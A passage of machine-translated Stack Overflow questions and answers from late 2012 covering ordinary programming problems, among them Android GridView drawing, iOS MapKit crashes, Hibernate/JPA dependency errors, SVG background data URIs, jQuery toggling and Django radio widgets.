我在语义视图控件的“放大”部分中有一个分组的网格视图。组可以是空的（我用过）。在我的“缩小”网格视图中，我列出了从“A”到“Z”的所有字母。引用空组的字母显示为已禁用（前景变暗，此处没有可用的“IsEnabled”属性）。我需要做的是中止“放大”转换，以响应单击与空组相对应的字母。有什么建议吗？谢谢你的时间。

奥尔夫·夸伦吉

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-09T21:59:56.333

我不能 100% 确定这个答案，因为我目前无法检查/测试 - 但作为建议，我会检查 IsEnabled 属性是否禁用触发的语义缩放转换。

您提到没有“IsEnabled”属性-您在检查什么？如果您使用数据模板在gridview 中呈现您的UI，您可以使用类似Border（确实具有IsEnabled）的东西来包装您的Child/Item UI，并将“IsEnabled”属性绑定到您放置在您的任何内容上的相应字段项目来源。

# android - GridView 无法显示来自适配器的元素

> ID：13704545
> 
> 赞同：3
> 
> 时间：2012-12-04T13:56:27.097
> 
> 标签：android, android-layout, android-view, android-gridview, android-adapter

嗨，我正在编写部分代码，我需要在网格视图上绘制 81 个元素。我基于 BaseAdapter 编写了我自己的自定义适配器。我的自定义视图的对象已创建，但未显示。

这是我的代码：带有简单网格元素的 XML：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android">
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    <pl.zapalka.sudoku.obj.SimpleFieldView 
        android:id="@+id/simpleFieldViewID"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" >

    </pl.zapalka.sudoku.obj.SimpleFieldView>    
</LinearLayout> 
```

自定义视图类：

```
public class SimpleFieldView extends View implements OnClickListener{

    private static final String TAG = "SimpleFieldView";

    private static SimpleFieldView _selectedView = null;
    private static Paint _paint = new Paint();

    private Rect _rectToDraw = new Rect(0, 0,100,100);
    private int _digit = 0;
    private boolean _locked = true;

    public SimpleFieldView(Context context) {
        super(context);
        Log.d(TAG, "Creating object");
        this.requestLayout();
        this.invalidate();
        // TODO Auto-generated constructor stub
    }

    public SimpleFieldView(Context context, AttributeSet attrs) {
        super(context, attrs);
        Log.d(TAG, "Creating object from XML");
        this.requestLayout();
        this.invalidate();
        // TODO Auto-generated constructor stub
    }

    public void setDigit(int d){
        this._digit = d;
    }

    public void setLocked(boolean l){
        this._locked = l;
    }

    @Override
    public void onClick(View v) {
        if(v != SimpleFieldView._selectedView){
            SimpleFieldView._selectedView = (SimpleFieldView) v;

        }

    }

    @Override
    protected void onDraw(Canvas canvas) {
        // TODO Auto-generated method stub
        Log.d(TAG, "Drawing element");
        super.onDraw(canvas);

        SimpleFieldView._paint.setColor(Color.BLACK);
        SimpleFieldView._paint.setStrokeWidth(4);
        canvas.drawRect(this._rectToDraw, SimpleFieldView._paint);

        if(this == SimpleFieldView._selectedView){

        }
    }

    @Override
    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        // TODO Auto-generated method stub
        super.onMeasure(widthMeasureSpec, heightMeasureSpec);
    }

    @Override
    protected void onSizeChanged(int w, int h, int oldw, int oldh) {
        // TODO Auto-generated method stub
        super.onSizeChanged(w, h, oldw, oldh);
        this._rectToDraw.set(0, 0, w, h);
    }
} 
```

自定义适配器：

```
public class SudokuGridAdapter extends BaseAdapter{

    ArrayList<SimpleFieldInfo> _listOfElements;
    Context _context;

    public SudokuGridAdapter(Context context, ArrayList<SimpleFieldInfo> list){
        this._listOfElements = list;
        this._context = context;
    }

    @Override
    public int getCount() {
        // TODO Auto-generated method stub
        return this._listOfElements.size();
    }

    @Override
    public Object getItem(int position) {
        // TODO Auto-generated method stub
        return this._listOfElements.get(position);
    }

    @Override
    public long getItemId(int position) {
        // TODO Auto-generated method stub
        return position;
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        SimpleFieldInfo info = this._listOfElements.get(position);

        if(convertView == null) {
            LayoutInflater inflater = LayoutInflater.from(_context);
            convertView = inflater.inflate(R.layout.simple_sudoku_field, null);
        }

        SimpleFieldView view = (SimpleFieldView)convertView.findViewById(R.id.simpleFieldViewID);
        view.setDigit(info.getDigit());
        view.setLocked(info.getLockedStatus());

        view.invalidate();

        return convertView; 
    }
} 
```

部分活动代码：

```
this.setContentView(R.layout.sudoku_layout);

        GridView v = (GridView) findViewById(R.id.sudokuGrid);
        v.setNumColumns(9);

        ArrayList<SimpleFieldInfo> list = new ArrayList<SimpleFieldInfo>();
        for(int i=0; i<81; i++){
            SimpleFieldInfo view = new SimpleFieldInfo(0, true);
            list.add(view);
        }

        SudokuGridAdapter adapter = new SudokuGridAdapter(this, list);

        v.setAdapter(adapter); 
```

问题是永远不会调用 OnDraw 方法，我不知道为什么：/

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T22:20:17.727

我看到的一个有问题的部分是你如何膨胀适配器内的视图。我会尝试：

```
convertView = inflater.inflate(R.layout.simple_sudoku_field, parent, false); 
```

代替：

```
convertView = inflater.inflate(R.layout.simple_sudoku_field, null); 
```

要检查的另一件事是您的自定义视图`Width and Height`。你只是 wrap_content 但在你的自定义视图中`onMeasure`你没有指定你的宽度和高度是什么......也许android把它当作0甚至不尝试绘制......为了快速测试更改`wrap_content to 20dp`或smth......

# iphone - iOS6 上 showUserLocation 上的 MKMapView 崩溃

> ID：13704548
> 
> 赞同：0
> 
> 时间：2012-12-04T13:56:33.617
> 
> 标签：iphone, ios, cocoa-touch, ios6, mapkit

我刚刚将我的 iOS SDK 更新到最新版本 (6.0)。我曾经在我的应用程序*MKMapView*中有几个地图视图，用于显示用户位置。

更新后，在设置属性时

```
mapView.showUserLoaction = YES; 
```

该应用程序崩溃，但出现以下异常：

> -[MKCoreLocationProvider locationManager:didUpdateToLocation:fromLocation:]：无法识别的选择器发送到实例 0x155af5f0

这发生在 iPhone iOS 6.0 模拟器上，而不是在具有早期版本操作系统的设备/模拟器上。只需设置属性即可重现错误。否则应用程序运行流畅。

该错误是在更新 SDK 后出现的。此外，我还没有在 iOS 6 设备上进行测试（不过，在这种设备上的所有测试都是使用以前版本的 SDK 执行的，并且应用程序没有崩溃）。

可能是什么问题？

**更新**：在 iOS6 设备中没有问题。问题仅出现在 iOS 6 模拟器上

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T22:15:05.023

你有没有尝试过 ？

```
[mapView setShowsUserLocation:YES]; 
```

如果您使用的是 MKMapView 如果您正在使用用户位置做某事，您也应该使用

```
- (void)mapView:(MKMapView *)mapView didUpdateUserLocation:(MKUserLocation *)userLocation
{

} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-04T15:29:56.423

我正在使用这个委托方法，这在 ios6 中对我来说很好用

```
-(void)locationManager:(CLLocationManager *)manager
     didUpdateLocations:(NSArray *)locations
{
} 
```

# php - 内容模板化服务器端中的客户端代码/表示分离

> ID：13704557
> 
> 赞同：1
> 
> 时间：2012-12-04T13:57:10.890
> 
> 标签：php, javascript, template-engine

我遇到了这样一种情况，即代码和表示分离的重要原则在 Web 应用程序开发中产生了问题，其中存在两个独立的部分：客户端和服务器。我不确定如何在没有技巧的情况下同时在两端遵守这一原则。

考虑一个带有服务器端模板的示例，生成一个客户端网页 ( `view`)，它应该知道服务器端`model`参数，以便可以将它们发送回服务器。例如，它可能看起来像这样：

```
<!-- File: form.template -->
<form id="main" name="main">
<input type="button" id="do" class="buttons" value="Do" onclick="requestDoFor(%modelid%)"/>
</form> 
```

这样的模板用于与代码适当分离的服务器上（例如，在 php 中，使用抽象模板引擎）：

```
$templateEngine->create('form.template', array('modelid' => $value))->render(); 
```

问题是模板不符合客户端的代码分离原则。生成的视图实际上应该没有任何 JavaScript，即`onclick`处理程序应该来自模板：

```
<input type="submit" id="do" class="buttons" value="Do" /> 
```

到一个单独的 JavaScript 文件：

```
$('#do').click(function(){requestDoFor(%modelid%);}); 
```

问题是如何将模型参数传递给客户端的这部分，这不是`view`（其实这是客户端的一部分`controller`），并且不是由服务器端模板引擎生成的？我可以想象模板中的快速解决方法：

```
<input type="submit" id="do" class="buttons" value="Do" objectid="%modelid%" /> 
```

和 JavaScript 中的类似内容：

```
$('#do').click(function(event){requestDoFor($(event.target).attr('objectid'))}); 
```

但它看起来并不完美。有没有更好的办法？

我知道有些人完全用 JavaScript 生成视图，然后在浏览器中生成 DOM 元素，但这种方法有其自身的缺点。还有什么可以建议的？

# python - DatabaseError：当前事务被中止，命令被忽略，直到事务块结束 - 在隐身模式但正常没有错误

> ID：13704559
> 
> 赞同：0
> 
> 时间：2012-12-04T13:57:18.250
> 
> 标签：python, django, postgresql

我在 chrome 的隐身模式下收到此错误：DatabaseError: current transaction is aborted, commands ignored until end of transaction block

但是，在正常模式下，我没有收到此错误。

我从一些中间件的 request.session.save 收到此错误。

最近从 1.3 升级到 1.4.2。

关于会话后端，我将其设置为数据库后端。当我更改为缓存后端时，它没有给出错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:33:57.503

你看到在隐身模式下，chrome 会自动删除 cookie 文件，而 django session 机制将 session id 和 csrf token 存储在 cookie 中。

您不能使用标准的 django 会话机制来删除 cookie。但是[有](http://www.stereoplex.com/blog/cookieless-django-sessions-and-authentication-with)一些方法可以在没有 cookie 的情况下实现会话。

# c# - 如何将字符串化的 JSON 传递给 C# 方法？

> ID：13704560
> 
> 赞同：3
> 
> 时间：2012-12-04T13:57:17.600
> 
> 标签：c#, asp.net, ajax, webforms, maps

我昨晚一直在试图弄清楚这一点。

基本上在谷歌地图中，​​我能够在用户在客户端 Javascript 中选择的两点之间生成方向或航路点。

理想情况下，我希望能够通过将这些传递给服务器端 C# 方法将它们存储在我的数据库中（我使用 C#.NET 和 SQL Server DB）。

我已经到了可以使用以下方法将我需要的方向放入字符串中的地步：

```
*var string = JSON.stringify(response);* 
```

现在，这就是我卡住的地方。

如何将其传递给 C# webforms 方法？

我已经看到了一个 MVC C# 解决我的问题的方法：

```
var str = JSON.stringify(data)

var city = {};
        city.Directions = str;
        $.ajax({
            type: 'POST',
            url: 'usertrip.aspx/GetDirections',
            data: str ,
            contentType: 'application/json; charset=utf-8',
            dataType: 'json',
            success: function (r) {
                alert(r.d.Directions);;
                }
        }); 
```

但我已经测试过，并得出结论认为这不适用于网络表单。有谁知道我可以如何更改此代码，以便我可以将字符串传递给 Webforms 方法而不是 MVC？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T14:05:12.587

你绝对可以用网络表单来做这种事情。重要的是，您需要设置一个 Web 服务来公开可能被 ajax 调用命中的方法。这篇名为“[使用 jQuery 直接调用 ASP.NET AJAX 页面方法](https://web.archive.org/web/20161229045603/http://encosia.com/using-jquery-to-directly-call-aspnet-ajax-page-methods/)”的精彩文章证明对我弄清楚如何完成您正在尝试做的事情非常宝贵。

例如（来自文章）做这样的事情：

```
public partial class _Default : Page 
{
  [WebMethod]
  public static string DoSomething(string myJsonData)
  {
    // deserialize your JSON
    // do something cool with it
  }
} 
```

将允许您通过 AJAX 调用访问 webmethod。我可以向您保证，我已经在许多不使用 MVC 的不同 asp.net 解决方案中完成了这项工作，因此只需稍加修改，您应该能够获得您需要的代码背后的信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T14:04:09.723

您需要执行以下操作：

```
var str = JSON.stringify(data)

var city = {};
        city.Directions = str;
        $.ajax({
            type: 'POST',
            url: 'usertrip.aspx/GetDirections',
            data: { city: str },
            contentType: 'application/json; charset=utf-8',
            dataType: 'json',
            success: function (r) {
                alert(r.d.Directions);;
                }
        }); 
```

在后面的 Webforms 代码中：

```
 City city = new JavaScriptSerializer().Deserialize<City>(Request.Form["city"]); 
```

# python - 应用引擎中延迟任务的模块导入错误

> ID：13704568
> 
> 赞同：4
> 
> 时间：2012-12-04T13:57:48.817
> 
> 标签：python, google-app-engine, task-queue, deferred

我正在使用 deferred.defer 创建任务。任务失败并出现以下错误。

```
Permanent failure attempting to execute task
Traceback (most recent call last):
  File "/base/python27_runtime/python27_lib/versions/1/google/appengine/ext/deferred/deferred.py", line 298, in post
  self.run_from_request()
  File "/base/python27_runtime/python27_lib/versions/1/google/appengine/ext/deferred/deferred.py", line 293, in run_from_request
  run(self.request.body)
  File "/base/python27_runtime/python27_lib/versions/1/google/appengine/ext/deferred/deferred.py", line 133, in run
raise PermanentTaskFailure(e)
PermanentTaskFailure: cannot import name location 
```

location 是我们源代码中的一个模块。

**额外细节：**

我在文件夹 lib 中也有第三方库。我有文件 third_party_libs.py

```
import os
import sys

sys.path.append(os.path.join(os.path.dirname(__file__), 'lib')) 
```

我将此文件包含在相关位置。我也尝试将它包含在所有 __init__.py 文件中。该错误特别神秘，堆栈跟踪是否未指向我的源代码中的任何位置有关如何调试此问题的任何指针将不胜感激。

# spring - 依赖错误导致 NoSuchMethodError: PersistenceUnitInfo.getSharedCacheMode()Ljavax/persistence/SharedCacheMode;

> ID：13704572
> 
> 赞同：1
> 
> 时间：2012-12-04T13:57:58.037
> 
> 标签：spring, hibernate, maven, jpa

所以我在为使用 Spring JPA 和 Hibernate 的项目配置依赖项时遇到了这个问题，我的依赖项看起来：

```
 <dependency>
                         <groupId>org.hibernate</groupId>
                         <artifactId>ejb3-persistence</artifactId>
                         <version>1.0.2.GA</version>
                </dependency>

                <dependency>
                       <groupId>org.hibernate</groupId>
                       <artifactId>hibernate-entitymanager</artifactId>
                       <version>3.5.0-Final</version>
                </dependency>
                        <dependency>
                        <groupId>org.springframework</groupId>
                        <artifactId>spring-orm</artifactId>
                        <version>${spring.version}</version>
                </dependency>

                <dependency>
                        <groupId>org.springframework</groupId>
                        <artifactId>spring-jpa</artifactId>
                        <version>2.0.8</version>
                </dependency> 
```

我得到的结束错误

```
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.springframework.transaction.interceptor.TransactionAttributeSourceAdvisor#0': Cannot create inner bean '(inner bean)' of type [org.springframework.transaction.interceptor.TransactionInterceptor] while setting bean property 'transactionInterceptor'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)#14': Cannot resolve reference to bean 'transactionManager' while setting bean property 'transactionManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'transactionManager' defined in ServletContext resource [/WEB-INF/hibernate-context.xml]: Cannot resolve reference to bean 'entityManagerFactory' while setting bean property 'entityManagerFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'entityManagerFactory' defined in ServletContext resource [/WEB-INF/hibernate-context.xml]: Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: javax.persistence.spi.PersistenceUnitInfo.getSharedCacheMode()Ljavax/persistence/SharedCacheMode;
    at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:281) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:125) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1360) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1118) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:517) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:294) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:225) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:291) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:193) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:609) ~[spring-beans-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:925) ~[spring-context-3.1.3.RELEASE.jar:3.1.3.RELEASE]
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:472) ~[spring-context-3.1.3.RELEASE.jar:3.1.3.RELEASE]
    at org.springframework.web.context.ContextLoader.configureAndRefreshWebApplicationContext(ContextLoader.java:383) ~[spring-web-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:283) ~[spring-web-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:111) [spring-web-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4791) [catalina.jar:7.0.30.A]
    at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5285) [catalina.jar:7.0.30.A]
    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150) [catalina.jar:7.0.30.A]
    at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901) [catalina.jar:7.0.30.A]
    at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877) [catalina.jar:7.0.30.A]
    at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:618) [catalina.jar:7.0.30.A]
    at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:650) [catalina.jar:7.0.30.A]
    at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1582) [catalina.jar:7.0.30.A]
    at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471) [na:1.7.0_09]
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334) [na:1.7.0_09]
    at java.util.concurrent.FutureTask.run(FutureTask.java:166) [na:1.7.0_09]
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110) [na:1.7.0_09]
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603) [na:1.7.0_09]
    at java.lang.Thread.run(Thread.java:722) [na:1.7.0_09] 
```

我找到了所有关于消除`Spring-jpa`依赖关系的解决方案，但是这样的操作会导致与无法加载相关的错误`persistence_1_0.xsd`。有什么线索我可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:35:41.950

添加对休眠 JPA2 的依赖：

```
 <dependency>
        <groupId>org.hibernate.javax.persistence</groupId>
        <artifactId>hibernate-jpa-2.0-api</artifactId>
        <version>1.0.0.Final</version>
    </dependency> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:30:47.253

您将需要使用以下依赖项添加之一来包含 jpa 的库。

```
 <dependency>
    <groupId>org.eclipse.persistence</groupId>
    <artifactId>javax.persistence</artifactId>
    <version>2.0.0</version>
  </dependency> 
```

# ruby-on-rails - 在 Rails/Asset 管道中是否可以将多个 SVG 压缩到一个文件中？

> ID：13704575
> 
> 赞同：0
> 
> 时间：2012-12-04T13:58:04.387
> 
> 标签：ruby-on-rails, ruby-on-rails-3, svg, asset-pipeline, sprockets

如您所知，您可以将多个 CSS 文件压缩为一个（或 JS 文件）。我想知道是否可以将多个 SVG 压缩到一个外部文件，所以服务器只发出一个请求

基本上 SVG 文件只是 XML 文本，所以理论上是可能的，但是有一个问题是如何在不同的地方渲染其中的几个图像

我是在想

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:43:35.100

检查这个问题的答案，它描述了如何配置 Asset Pipeline 将管理的文件类型：[Using fonts with Rails](https://stackoverflow.com/questions/10905905/using-fonts-with-rails-asset-pipeline) Asset Pipeline （尽管标题如此，但它不仅适用于字体）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T10:17:58.530

谢谢回答，但最后我最终这样做了：

在我的情况下，我想使用我的 SVG 作为 div 标签的背景图像，所以我不需要预编译 SVG，我只是将压缩格式直接放到`background-image: url('here')`

所以对于多个SVG背景：

```
width: 600px:
height: 400px:
background-image: url('data:image/svg+xml ...first svg '), url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIj8+Cjxzdmcgd2lkdGg9IjY0MCIgaGVpZ2h0PSI0ODAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiA8IS0tIENyZWF0ZWQgd2l0aCBTVkctZWRpdCAtIGh0dHA6Ly9zdmctZWRpdC5nb29nbGVjb2RlLmNvbS8gLS0+CgogPGc+CiAgPHRpdGxlPkxheWVyIDE8L3RpdGxlPgogIDxwb2x5bGluZSBpZD0ic3ZnXzMiIHBvaW50cz0iNTM4LjUsMzMzLjU2OTU2NDgxOTMzNTk0IDMyMi4yNSwyNzguMjg0NzgyNDA5NjY3OTcgMTA2LDIyMyAiIHN0cm9rZT0iIzAwMDAwMCIgc3Ryb2tlLXdpZHRoPSI1IiBmaWxsPSJub25lIi8+CiAgPGVsbGlwc2UgZmlsbD0iI0ZGMDAwMCIgc3Ryb2tlPSIjMDAwMDAwIiBzdHJva2Utd2lkdGg9IjUiIGN4PSIzNDMiIGN5PSIxNzAiIGlkPSJzdmdfMSIgcng9IjE0MCIgcnk9IjEwNSIvPgogPC9nPgo8L3N2Zz4=') 
```

在这里检查： http: [//codepen.io/equivalent/full/ymefJ](http://codepen.io/equivalent/full/ymefJ)

原始 svg 格式：

```
<svg width="640" height="480" xmlns="http://www.w3.org/2000/svg">
 <!-- Created with SVG-edit - http://svg-edit.googlecode.com/ -->
 <g>
  <title>Layer 1</title>
  <polyline fill="none" stroke-width="5" stroke="#000000" points="538.5,333.56956481933594 322.25,278.28478240966797 106,223 " id="svg_3"/>
  <ellipse transform="translate(-402 -120)" ry="105" rx="140" id="svg_1" cy="290" cx="745" stroke-width="5" stroke="#000000" fill="#FF0000"/>
 </g>
</svg> 
```

编辑器：[http ://svg-edit.googlecode.com/svn/trunk/editor/svg-editor.html](http://svg-edit.googlecode.com/svn/trunk/editor/svg-editor.html)

我相信 [汤姆哈里森](https://stackoverflow.com/a/13705429/473040)回答中的链接是关于某些事情的，从我所看到的情况来看它可能会起作用，但我自己并没有尝试过。因此，如果您想真正使用资产管道预编译 SVG，我鼓励您使用这种策略。

# javascript - IE9 上的基本 jQuery 问题（切换）

> ID：13704588
> 
> 赞同：0
> 
> 时间：2012-12-04T13:58:31.640
> 
> 标签：javascript, jquery, internet-explorer-9, toggle

我不是真正的开发人员。我更喜欢设计我的网站……所以，对于我的实际项目，我必须开发一些“基本”脚本。

我遇到了一个问题：

```
<script type="text/javascript">
$("button").click(function toggleDiv(divId) {
$("#"+divId).toggle();
});
;
</script> 
```

进入头部-/头部

```
<a href="javascript:toggleDiv('myContent');">LINK</a> 
<div> id="myContent">Lorem Ipsum</div> 
```

它适用于 IE8。（奇迹）。但不是其他浏览器......这个想法是，当你点击“链接”时，会出现一个窗口，当你再次点击时，窗口会关闭。

任何想法 ？

谢谢你的时间！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:06:00.980

问题之一是您混合了两种不同样式的绑定事件处理程序：一种是好的（jQuery 方法），另一种是坏的（属性`javascript:`中的协议`href`）——两者不能以任何方式一起工作. 另一个问题是您的选择器对于您提供的 HTML 完全不正确（它正在寻找一个按钮）（您从不创建按钮）。

我建议使用 HTML5`data-*`属性来`id`为`<div>`你的`<a>`元素指定：

```
<a href="#" data-divid="mycontent">LINK</a>
<div id="mycontent">Lorem ipsum</div> 
```

然后使用以下 jQuery 代码：

```
$('a').click(function(e) {
    e.preventDefault(); // e refers to the event (the click),
    // calling preventDefault() will stop you following the link
    var divId = $(this).data('divid');
    $('#' + divId).toggle();
}); 
```

请注意，我`this`在上面的代码中使用过；所指`this`的内容取决于您使用它的上下文，但在 jQuery 事件处理程序回调函数的上下文中，它将始终引用触发事件的元素（在本例中为您的`<a>`元素）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:10:50.230

如果您从处理程序中提取 toggleDiv，它应该可以工作。您可能还需要返回 false 以防止 href 尝试去任何地方。

```
<script type="text/javascript">
    function toggleDiv(divId) {
        $("#"+divId).toggle();
        return false;
    }
</script> 
```

# css - CSS 生成的内容是否仅适用于文本？

> ID：13704589
> 
> 赞同：1
> 
> 时间：2012-12-04T13:58:41.937
> 
> 标签：css

CSS 生成的内容是否仅适用于文本？例如，下面的代码将跨度显示为文本，它不会创建新的跨度。

```
.addbefore:before {
    content: "<span>dfsd</span>";
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:01:00.843

> CSS 生成的内容是否仅适用于文本？

是的。

[伪元素](http://www.w3.org/TR/selectors/#gen-content)不会在它们自己内部创建新的 DOM 元素，但它们会被视为它们匹配的选择器中的新 DOM 元素。

# android - Android 传感器硬件抽象层

> ID：13704591
> 
> 赞同：1
> 
> 时间：2012-12-04T13:59:01.077
> 
> 标签：android, input, linux-kernel, sensors, hal

我正在研究 Android 中的传感器数据采集（Samsung Galaxy S3 上的 Jelly Bean）。我是 Android/Linux 内部的新手。

我正在尝试阅读有关传感器样本如何从驱动程序上升到用户空间的 Android 资源。作为参考看看[这里](http://processors.wiki.ti.com/index.php/Android_Sensor_PortingGuide)。我可以从 SensorManager 一直到 SensorService。我可以看到内核模块加载基础结构、事件输入设备的注册以及驱动程序中的 input_report_rel() 函数调用（例如 Galaxy S3 的开源加速度计驱动程序）。但我迷失在两者之间，即在硬件抽象层中。SensorService（借助 SensorDevice）最终通过 struct sensors_poll_device_t 中的函数指针调用 HAL。头文件位于 /hardware/libhardware/include/hardware 中。

HAL 在哪里实施？HAL 和内核输入子系统之间的交互是如何进行的？SensorService 如何发现平台中可用的传感器以及从用户空间访问它们的文件？

任何形式的帮助表示赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T06:51:16.430

有关 Android Sensors HAL 适合的位置及其职责的高级地图，请查看我在 2012 年[将传感器集成到 Android 硬件](http://riansanderson.blogspot.com/2012/03/integrating-sensors-into-android.html)中的 Design West 演示文稿中的幻灯片。

幻灯片详细介绍了如何使用广泛可用的 SensorBase 类来读取基于输入事件的传感器驱动程序，以及 HAL 如何实现 get_sensors_list 函数以让 SensorService 知道该特定设备具有哪些传感器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-04T08:52:50.250

我知道 beaglebone（TI 开发板），传感器 HAL 源代码位于 /device/ti/am335xevm/libsensors/ 。搜索关键字“libsensors”是一种简单的方法。

# django - 如何为 TypedChoiceField 的？

> ID：13704592
> 
> 赞同：0
> 
> 时间：2012-12-04T13:59:02.607
> 
> 标签：django, django-forms

我正在渲染一个`TypedChoiceField`带有`RadioSelect`小部件的 , 。小部件的设置`attrs={'class':'radio'}`，此类应用于`<input>`，但此输入嵌套在 中`<ul>`。我想为此设置一个类，`<ul>`我应该在哪里设置？

我目前仍在使用 Django 1.3，所以 a`RadioSelect`不是一个选项。

从我的表格：

```
yesno = forms.TypedChoiceField(
               coerce=lambda x: True if x == 'Yes' else False,
               choices=((False, 'No'), (True, 'Yes')),
               widget=forms.RadioSelect) 
```

实际的 HTML：

```
<ul>
<li>
  <label for="yesno_0">
    <input value="False" type="radio" name="yesno" id="yesno_0"> 
    No
  </label>
</li>
<li>
  <label for="yesno_1">
    <input name="yesno" value="True" id="yesno_1" type="radio"> 
    Yes
  </label>
</li>
</ul> 
```

我想要什么：

```
<ul class='myclass'>
<li>
  <label for="yesno_0">
... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:12:32.473

我看到的最简单的方法：您可以创建一个自定义 RadioSelect 小部件，从 widgets.RadioSelect 继承并覆盖“renderer”属性并将其设置为您的自定义 RadioFieldRenderer（也从 widgets.RadioFieldRenderer 继承）并覆盖“render”方法

```
class CustomRadioFieldRenderer(widgets.RadioFieldRenderer):
    def render(self):
        return mark_safe(u'<ul class="YOUR-CLASS-HERE">\n%s\n</ul>' % u'\n'.join([u'<li>%s</li>'
            % force_unicode(w) for w in self]))

class CustomRadioSelect(widgets.RadioSelect):
    renderer = CustomRadioFieldRenderer

yesno = forms.TypedChoiceField(widget=CustomRadioSelect, *args, **kwargs) 
```

或者`render`用 a调用，`super()`然后`<ul>`用 a替换`<ul class=''>`，这是一个细节

# gtk - GtkScrolledWindow 已映射但可见子 GtkScrollbar 未映射

> ID：13704596
> 
> 赞同：2
> 
> 时间：2012-12-04T13:59:19.487
> 
> 标签：gtk

我试图从文本文件中保存和加载树视图

带有滚动窗口容器的 reeview：

```
GtkWidget *scrolledwindow = gtk_scrolled_window_new(NULL, NULL);
gtk_scrolled_window_set_shadow_type(GTK_SCROLLED_WINDOW(scrolledwindow), GTK_SHADOW_IN);
gtk_scrolled_window_set_policy (GTK_SCROLLED_WINDOW (scrolledwindow), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);

GtkListStore *store = gtk_list_store_new(2, G_TYPE_STRING, G_TYPE_STRING);
